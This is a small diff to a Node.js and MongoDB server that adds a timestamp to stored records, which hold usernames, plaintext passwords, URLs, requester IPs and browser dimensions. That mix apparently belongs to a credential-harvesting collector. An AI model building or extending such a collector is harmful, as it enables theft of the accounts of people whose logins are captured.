@@ -353,10 +353,11 @@ MongoClient.connect(config.mongodb, function(err, db) {
 								{
 									$push: {
 										records: {
-											username: record[username],
-											password: record[password],
-											url		: record[url],
-											ip		: req.ip,
+											timestamp	: Math.round(new Date().getTime() / 1000),
+											username	: record[username],
+											password	: record[password],
+											url			: record[url],
+											ip			: req.ip,
 											browser: {
 												width	: record[width],
 												height	: record[height],
